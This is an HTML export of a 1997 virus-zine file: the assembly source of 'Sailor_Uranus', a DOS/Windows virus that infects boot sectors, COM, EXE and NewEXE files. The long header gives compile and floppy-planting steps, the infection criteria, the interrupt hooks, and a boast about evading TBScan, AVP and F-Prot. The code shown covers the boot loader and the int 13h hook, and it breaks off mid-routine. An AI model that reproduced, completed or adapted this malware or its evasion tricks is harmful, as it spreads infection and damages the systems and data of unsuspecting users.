<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #2 - Phile 026 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus name    : Sailor_Uranus</span><span class="sc0">
</span><span class="sc1">; Author        : b0z0</span><span class="sc0">
</span><span class="sc1">; Group         : iKx</span><span class="sc0">
</span><span class="sc1">; Origin        : Padania, December 1996 / January 1997</span><span class="sc0">
</span><span class="sc1">; Compiling     : Use TASM 3.00</span><span class="sc0">
</span><span class="sc1">;                 TASM /ZI /M2 URA.ASM</span><span class="sc0">
</span><span class="sc1">;                 TLINK /M /V URA</span><span class="sc0">
</span><span class="sc1">;                 TDSTRIP -C URA.EXE</span><span class="sc0">
</span><span class="sc1">;                 Then put the first 512 bytes into a floppy boot sector</span><span class="sc0">
</span><span class="sc1">;                 and the rest to the floppy boot starting at 79,1,13.</span><span class="sc0">
</span><span class="sc1">;                 Remember also to put the original boot sector to 79,1,12</span><span class="sc0">
</span><span class="sc1">; Targets       : HD Boot Sector / FD Boot Sector / COM / EXE / NewEXE</span><span class="sc0">
</span><span class="sc1">;                 Infected COMs:</span><span class="sc0">
</span><span class="sc1">;                                       All COMs that are smaller than</span><span class="sc0">
</span><span class="sc1">;                                       62463 and bigger than 1280 will</span><span class="sc0">
</span><span class="sc1">;                                       be infected. Some antiviruses and</span><span class="sc0">
</span><span class="sc1">;                                       special files won't be infected</span><span class="sc0">
</span><span class="sc1">;                                       (in all three cases). Check the</span><span class="sc0">
</span><span class="sc1">;                                       source code for more about these</span><span class="sc0">
</span><span class="sc1">;                                       files.</span><span class="sc0">
</span><span class="sc1">;                 Infected EXEs:</span><span class="sc0">
</span><span class="sc1">;                                       All EXEs without overlays and</span><span class="sc0">
</span><span class="sc1">;                                       bigger than 5000 will be infected.</span><span class="sc0">
</span><span class="sc1">;                                       This lenght check is also valid</span><span class="sc0">
</span><span class="sc1">;                                       for NewEXEs.</span><span class="sc0">
</span><span class="sc1">;                 Infected NewEXEs:</span><span class="sc0">
</span><span class="sc1">;                                       .CPL (control panel files)</span><span class="sc0">
</span><span class="sc1">;                                       .DLL (dynamic link libs)</span><span class="sc0">
</span><span class="sc1">;                                       .DRV (drivers)</span><span class="sc0">
</span><span class="sc1">;                                       .EXE (just normal NewEXEs :-) )</span><span class="sc0">
</span><span class="sc1">;                                       .FON (fonts)</span><span class="sc0">
</span><span class="sc1">;                                       .FOT (other fonts... they are quite</span><span class="sc0">
</span><span class="sc1">;                                             newer infected.. they are all</span><span class="sc0">
</span><span class="sc1">;                                             skipped at the lenght test)</span><span class="sc0">
</span><span class="sc1">;                                       .SCR (screen savers)</span><span class="sc0">
</span><span class="sc1">;                                       The NewEXE infection is done using</span><span class="sc0">
</span><span class="sc1">;                                       the VLAD-method (thanx Qark and</span><span class="sc0">
</span><span class="sc1">;                                       QuantumG). There has been added some</span><span class="sc0">
</span><span class="sc1">;                                       more check and modifies so now all</span><span class="sc0">
</span><span class="sc1">;                                       infected NewEXEs will work correctly.</span><span class="sc0">
</span><span class="sc1">;                 Infected Floppy Boots:</span><span class="sc0">
</span><span class="sc1">;                                       Only 1.44mb floppyes will be infected.</span><span class="sc0">
</span><span class="sc1">;                                       The virus won't infect floppies that</span><span class="sc0">
</span><span class="sc1">;                                       have a 'PK' as the label start. This</span><span class="sc0">
</span><span class="sc1">;                                       is done to try to prevent damaging at</span><span class="sc0">
</span><span class="sc1">;                                       least PKZIP multidisk archives.</span><span class="sc0">
</span><span class="sc1">;                 Infected HD boot:</span><span class="sc0">
</span><span class="sc1">;                                       The boot sector of the first active</span><span class="sc0">
</span><span class="sc1">;                                       partition will be infected. The active</span><span class="sc0">
</span><span class="sc1">;                                       partition will be determined by a check</span><span class="sc0">
</span><span class="sc1">;                                       in the partition table. Generally the</span><span class="sc0">
</span><span class="sc1">;                                       DOS bootable partition is also set as</span><span class="sc0">
</span><span class="sc1">;                                       active.</span><span class="sc0">
</span><span class="sc1">; Hooked ints   : 13h and 21h</span><span class="sc0">
</span><span class="sc1">;                 13h is hooked for floppy boot infections (AH = 02h)</span><span class="sc0">
</span><span class="sc1">;                 21h hooked functions:</span><span class="sc0">
</span><span class="sc1">;                       4b00h   = Load and Execute</span><span class="sc0">
</span><span class="sc1">;                       4eh     = Findfirst</span><span class="sc0">
</span><span class="sc1">;                       4fh     = Findnext</span><span class="sc0">
</span><span class="sc1">; Size          : Sailor_Uranus fits exactly (well, considering also the</span><span class="sc0">
</span><span class="sc1">;                 place for BPB data and 2 unused bytes :)) 4 floppy disk</span><span class="sc0">
</span><span class="sc1">;                 sectors (boot + 3 at the end of the floppy). Infected</span><span class="sc0">
</span><span class="sc1">;                 files (all kinds) will grow then 2048 bytes.</span><span class="sc0">
</span><span class="sc1">; Notes         : Sailor_Uranus can go resident just if started from an</span><span class="sc0">
</span><span class="sc1">;                 infected boot. So any infected file will check if the</span><span class="sc0">
</span><span class="sc1">;                 virus is resident and if it isn't it will infect the</span><span class="sc0">
</span><span class="sc1">;                 HD boot. The virus infects the HD boot in two ways:</span><span class="sc0">
</span><span class="sc1">;                       - Using int 13h, if it is runned from and infected</span><span class="sc0">
</span><span class="sc1">;                         COM or EXE.</span><span class="sc0">
</span><span class="sc1">;                       - Using the IOCTL int 21h functions (440dh) if it</span><span class="sc0">
</span><span class="sc1">;                         is runned from a NewEXE</span><span class="sc0">
</span><span class="sc1">;                 This has been done because of course you can't directly</span><span class="sc0">
</span><span class="sc1">;                 use the int 13h calls while you are in protected mode,</span><span class="sc0">
</span><span class="sc1">;                 simply because selectors would be threated by the int 13h</span><span class="sc0">
</span><span class="sc1">;                 as a segment and this, as you may imagine, won't work</span><span class="sc0">
</span><span class="sc1">;                 very well :-) So using IOCTL we will give him our selectors</span><span class="sc0">
</span><span class="sc1">;                 and Win will do the whole work of convertion and so on for</span><span class="sc0">
</span><span class="sc1">;                 us. On the other side the IOCTL functions may be also used</span><span class="sc0">
</span><span class="sc1">;                 from the DOS, so why two ways of infections? The response</span><span class="sc0">
</span><span class="sc1">;                 is simple: IOCTL functions doesn't work with DBLSPACE and</span><span class="sc0">
</span><span class="sc1">;                 such programs, which are quite used around :( So i added</span><span class="sc0">
</span><span class="sc1">;                 also a second more standard int 13h way to infect.</span><span class="sc0">
</span><span class="sc1">;                  Sailor_Uranus have also 2 ways to hook int 21h. The first</span><span class="sc0">
</span><span class="sc1">;                 is the classic way to wait for 5 EXEs to be executed and</span><span class="sc0">
</span><span class="sc1">;                 checking the buffer for a 'MZ' at int 13h. The second is</span><span class="sc0">
</span><span class="sc1">;                 an "infected activation routine", this means that when an</span><span class="sc0">
</span><span class="sc1">;                 infected file is runned (this is only for DOS files) it</span><span class="sc0">
</span><span class="sc1">;                 will automatically trigger to the int 13h a check if the</span><span class="sc0">
</span><span class="sc1">;                 int 21h is already set. So the 'residency check' of the</span><span class="sc0">
</span><span class="sc1">;                 int 13h is also used to set int 21h. Maybe you are now</span><span class="sc0">
</span><span class="sc1">;                 thinking why i do this. Well, simple. On some DOS 6.22 with</span><span class="sc0">
</span><span class="sc1">;                 SMARTDRV and DRVSPACE loaded and a couple of other Windoze</span><span class="sc0">
</span><span class="sc1">;                 stuff int 13h 'MZ' check doesn't work.So on DOS 6.22 without</span><span class="sc0">
</span><span class="sc1">;                 the infected activation the virus may never hook int 21h.</span><span class="sc0">
</span><span class="sc1">;                  Residency: well, Sailor_Uranus doesn't hook interrupts</span><span class="sc0">
</span><span class="sc1">;                 under Windows. As you know Windows doesn't pass AH=4bh</span><span class="sc0">
</span><span class="sc1">;                 calls to the real mode interrupt (the DOS one). But it</span><span class="sc0">
</span><span class="sc1">;                 will pass usually all the 4Eh/4Fh calls, so under Win this</span><span class="sc0">
</span><span class="sc1">;                 virus will be able to infect files when they are searched</span><span class="sc0">
</span><span class="sc1">;                 (for example FileManager uses 4Eh/4Fh, so when the user will</span><span class="sc0">
</span><span class="sc1">;                 browse his dirs files will be infected). Now you may ask</span><span class="sc0">
</span><span class="sc1">;                 yourself why i said "will pass usually", why "usually"?</span><span class="sc0">
</span><span class="sc1">;                 Well, Win will pass these functions to the real mode</span><span class="sc0">
</span><span class="sc1">;                 int 21h only if the 32-bit access (32BFA) is disabled.</span><span class="sc0">
</span><span class="sc1">;                 But, hey! 32-bit access is disabled by default and also</span><span class="sc0">
</span><span class="sc1">;                 Microsuck doesn't encurage the users to use it. So, be</span><span class="sc0">
</span><span class="sc1">;                 sure, that more than the 95% of users has 32BFA turned off!</span><span class="sc0">
</span><span class="sc1">;                  About the various NewEXEs files that are infected.</span><span class="sc0">
</span><span class="sc1">;                 Obvisiously i am not pretending that FOTs or CPLs will</span><span class="sc0">
</span><span class="sc1">;                 carry the virus around :-) Basically i decided to infect</span><span class="sc0">
</span><span class="sc1">;                 them to mantain the virus on a system. Mainly anything</span><span class="sc0">
</span><span class="sc1">;                 that is Windows releated will be infected ;-) On the other</span><span class="sc0">
</span><span class="sc1">;                 side some of the strange infected files may be also</span><span class="sc0">
</span><span class="sc1">;                 considered as couriers. DRVs for example are very usual</span><span class="sc0">
</span><span class="sc1">;                 on various card vendor's disks. Also some screensavers</span><span class="sc0">
</span><span class="sc1">;                 may be distribuited around by ppl. Also VBX infection</span><span class="sc0">
</span><span class="sc1">;                 works ok, but many VBXs i tried to infect noticed the</span><span class="sc0">
</span><span class="sc1">;                 user that they have been changed, so i decided not to</span><span class="sc0">
</span><span class="sc1">;                 infect at all VBXs.</span><span class="sc0">
</span><span class="sc1">;                  To prevent an enormous loss of time files on floppy disk</span><span class="sc0">
</span><span class="sc1">;                 aren't infected.</span><span class="sc0">
</span><span class="sc1">;                  Sailor_Uranus uses the 18_Tech (refeer to Dandler's</span><span class="sc0">
</span><span class="sc1">;                 article for more information about this), so wind0ze</span><span class="sc0">
</span><span class="sc1">;                 (when 32 BDA is enabled) and some avs won't worry</span><span class="sc0">
</span><span class="sc1">;                 about our int 13h handler ;)</span><span class="sc0">
</span><span class="sc1">; AV, speak!    : What does various AV says</span><span class="sc0">
</span><span class="sc1">;                       TBScan 7.06:</span><span class="sc0">
</span><span class="sc1">;                                       COM    - No Flags!</span><span class="sc0">
</span><span class="sc1">;                                       EXE    - K flag often</span><span class="sc0">
</span><span class="sc1">;                                       NewEXE :</span><span class="sc0">
</span><span class="sc1">;                                           .EXE   - only B flag quite always</span><span class="sc0">
</span><span class="sc1">;                                           others - No scan at all :-)</span><span class="sc0">
</span><span class="sc1">;                                       Boot   - No Flags!</span><span class="sc0">
</span><span class="sc1">;                       AVPlite 3.0 (updated bases):</span><span class="sc0">
</span><span class="sc1">;                                       EXE - *sometime* Typo_COMTsr susp.</span><span class="sc0">
</span><span class="sc1">;                                       COM - *sometime* Typo_COMTsr susp.</span><span class="sc0">
</span><span class="sc1">;                               All NewExes - Nothing!</span><span class="sc0">
</span><span class="sc1">;                                      Boot - Nothing!</span><span class="sc0">
</span><span class="sc1">;                       FProt 2.25:</span><span class="sc0">
</span><span class="sc1">;                               - Normal scan</span><span class="sc0">
</span><span class="sc1">;                                       Nothing in any case.</span><span class="sc0">
</span><span class="sc1">;                               - /analyse</span><span class="sc0">
</span><span class="sc1">;                                       Will give a warning only on some COMs</span><span class="sc0">
</span><span class="sc1">;                               - /analyse /paranoid</span><span class="sc0">
</span><span class="sc1">;                                       Will give a warning only on some COMs</span><span class="sc0">
</span><span class="sc1">;                 Well, the results of other AVs (Scan, NAV and so on) are</span><span class="sc0">
</span><span class="sc1">;                 all the same... i'll let you imagine :-)))</span><span class="sc0">
</span><span class="sc1">; Name origin   : Sailor_Uranus is dedicated to Sailor Uranus, one of the</span><span class="sc0">
</span><span class="sc1">;                 Pretty Sailor Soldiers family.</span><span class="sc0">
</span><span class="sc1">; For more info : Of course, if you aren't satisfacted with my description</span><span class="sc0">
</span><span class="sc1">;                 and you don't have time to check out the code get VSUM</span><span class="sc0">
</span><span class="sc1">;                 (the year 2000 one, November edition) and read more</span><span class="sc0">
</span><span class="sc1">;                 interesting things about Sailor_Uranus 8-)</span><span class="sc0">
</span><span class="sc1">; Greetings     : Of course a great thanx to Qark and QuantumG for writing</span><span class="sc0">
</span><span class="sc1">;                 the NewEXE infection tuorial and NE infectors.</span><span class="sc0">
</span><span class="sc1">;                 Thanx to Dandler for the very nice Int 18h trick infos!</span><span class="sc0">
</span><span class="sc1">;                 Thanx also to Darkman for the 4Eh/4Fh tutorial. You saved</span><span class="sc0">
</span><span class="sc1">;                 me a little of time ;)</span><span class="sc0">
</span><span class="sc1">; Registration  : hehe :-) if you liked this virus just send me a line...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">


</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">virus_lenght</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">boot_start</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">3eh</span><span class="sc0">

</span><span class="sc5">boot_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; set SS:SP to 0000:7C00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">412h</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ax = avaiable mem</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; 3 kb 'o' mem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ES segment for our virus</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                 </span><span class="sc1">; copy 200h virus bytes</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; in memory</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">203h</span><span class="sc0">                 </span><span class="sc1">; read the body of the virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; on hd at 0,0,3</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">fromfloppy</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7c00h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">load_from_hd</span><span class="sc0">            </span><span class="sc1">; or on floppy at</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4f0dh</span><span class="sc0">                </span><span class="sc1">; cylinder 79, sector 0dh</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">                      </span><span class="sc1">; side 1</span><span class="sc0">

</span><span class="sc5">load_from_hd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">int21set</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">      </span><span class="sc1">; int 21h set flag</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc0">                 </span><span class="sc1">; on 13h IVT entry</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; save old int 13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">seg13h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; off:seg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">off13h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f000h</span><span class="sc0">               </span><span class="sc1">; point to rom</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">cd18loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">18cdh</span><span class="sc0">  </span><span class="sc1">; search for the int 18h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cd18loop</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">; point int13h to the cd18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_int13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; set int 18h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; es=ds=00</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                 </span><span class="sc1">; load the original bs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; 0,0,2 on hd</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">fromfloppy</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7c00h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">load_bs_from_hd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4f0ch</span><span class="sc0">                </span><span class="sc1">; or here on floppy</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">

</span><span class="sc5">load_bs_from_hd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">7c00h</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">13cdh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">virus_start</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; pass to original bs</span><span class="sc0">

</span><span class="sc5">fromfloppy</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; 00h = floppy, 01h = hd</span><span class="sc0">

</span><span class="sc5">new_int13h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; correct stack</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; antiheuristic</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2301h</span><span class="sc0">                </span><span class="sc1">; installation check</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_inst_check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc0">                 </span><span class="sc1">; from a dos executable?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">alr_21handler</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; yea, so try to force</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; loading of int21 handler</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">force_int21h_set</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">alr_21handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">no_inst_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; read</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; reput right stuff in AX</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_floppy</span><span class="sc0">

                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                   </span><span class="sc1">; old int 13h</span><span class="sc0">
</span><span class="sc5">off13h</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
